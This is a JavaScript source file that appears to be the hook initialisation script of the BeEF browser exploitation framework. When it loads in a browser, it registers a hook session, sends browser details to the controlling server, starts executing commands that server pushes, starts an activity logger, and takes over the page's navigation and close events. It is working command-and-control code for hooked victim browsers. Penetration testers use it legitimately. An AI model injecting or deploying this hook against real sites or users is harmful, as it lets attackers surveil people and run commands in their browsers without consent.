//
//   Copyright 2012 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

// if beef.pageIsLoaded is true, then this JS has been loaded >1 times 
// and will have a new session id. The new session id will need to know
// the brwoser details. So sendback the browser details again.

BEEFHOOK = beef.session.get_hook_session_id();

if (beef.pageIsLoaded) {
    beef.net.browser_details();
}

window.onload = function () {
    beef_init();
};

window.onpopstate = function (event) {
    if (beef.onpopstate.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onpopstate.length; i++) {
            var callback = beef.onpopstate[i];
            try {
                callback(event);
            } catch (e) {
                console.log("window.onpopstate - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

window.onclose = function (event) {
    if (beef.onclose.length > 0) {
        event.preventDefault;
        for (var i = 0; i < beef.onclose.length; i++) {
            var callback = beef.onclose[i];
            try {
                callback(event);
            } catch (e) {
                console.log("window.onclose - couldn't execute callback: " + e.message);
            }
            return false;
        }
    }
};

function beef_init() {
    if (!beef.pageIsLoaded) {
        beef.pageIsLoaded = true;
        if (beef.browser.hasWebSocket() && typeof beef.websocket != 'undefined') {
            beef.websocket.start();
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.logger.start();

        }
        else {
            beef.net.browser_details();
            beef.updater.execute_commands();
            beef.updater.check();
            beef.logger.start();
        }

    }
}
